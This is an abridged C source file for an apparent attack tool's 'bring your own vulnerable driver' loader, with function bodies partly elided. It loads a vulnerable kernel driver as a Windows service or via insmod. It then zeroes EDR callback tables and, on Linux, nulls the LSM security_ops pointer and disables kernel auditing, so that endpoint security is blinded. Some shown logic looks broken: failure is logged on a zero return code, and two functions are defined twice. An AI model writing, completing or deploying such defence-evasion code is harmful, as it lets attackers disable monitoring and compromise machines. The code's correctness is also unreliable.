/* ============================================================================
 * Proteus- Execution Engine -- byovd_loader.c
...
static BOOL open_vulnerable_driver(void) {
    ...
    for (int i = 0; devices[i]; i++) {
        ...
        if (g_hDriver != INVALID_HANDLE_VALUE) {
            LOG_INFO("[*] Opened vulnerable driver: %s", devices[i]);
            return TRUE;
        }
    }
    return FALSE;
...
int disable_edr_callbacks(void) {
    ...
    if (!read_kernel_memory_ioctl(tableAddr, callbackTable, sizeof(callbackTable))) {
        LOG_INFO("[!] Failed to read callback table at 0x%p", (void*)tableAddr);
        return -1;
    }
    ...
    for (int i = 0; i < 64; i++) {
        if (callbackTable[i] != 0) {
            LOG_INFO("[*] Zeroing callback %d at 0x%p", i, (void*)callbackTable[i]);
            callbackTable[i] = 0;
            count++;
        }
    }
    ...
    LOG_INFO("[+] Disabled %d EDR callbacks.", count);
    return 0;
}
...
int load_byovd(const char* driver_path) {
    ...
    LOG_INFO("[*] Loading vulnerable driver: %s", driver_path);
    ...
    if (!scm) {
        LOG_INFO("[!] Failed to open SCM: %lu", GetLastError());
        return -1;
    }
    ...
    if (!svc) {
        LOG_INFO("[!] Failed to create service: %lu", GetLastError());
        CloseServiceHandle(scm);
        return -1;
    }
    LOG_INFO("[+] Created service: %s", serviceName);

    if (!StartServiceA(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            LOG_INFO("[!] Failed to start service: %lu", err);
            DeleteService(svc);
...
int unload_byovd(const char* driver_name) {
    ...
    LOG_INFO("[*] Unloading driver: %s", name);
    ...
    if (!svc) {
        LOG_INFO("[!] Service not found: %lu", GetLastError());
        CloseServiceHandle(scm);
        return -1;
    }
...
int disable_edr_callbacks(void) {
    ...
    if (security_ops_addr) {
        ...
        if (_write_kmem_internal(security_ops_addr, &null_ptr, sizeof(null_ptr)) == 0) {
            LOG_INFO("[+] Disabled security_ops (LSM) at 0x%lx", security_ops_addr);
        } else {
    ...
    if (audit_enabled_addr) {
        ...
        if (_write_kmem_internal(audit_enabled_addr, &zero, sizeof(zero)) == 0) {
            LOG_INFO("[+] Disabled audit_enabled at 0x%lx", audit_enabled_addr);
        } else {
...
int load_byovd(const char* driver_path) {
    ...
    LOG_INFO("[*] Loading vulnerable driver (Linux): %s", driver_path);
    char cmd[512];
    ...
    if (ret == 0) {
        ...
        LOG_INFO("[!] Failed to load driver (insmod returned %d)", ret);
        return -1;
    }
}
...
int unload_byovd(const char* driver_name) {
    ...
    LOG_INFO("[*] Unloading driver (Linux): %s", driver_name);
    char cmd[256];
    ...
    if (ret == 0) {
        ...
        LOG_INFO("[!] Failed to unload driver (rmmod returned %d)", ret);
        return -1;
    }
}
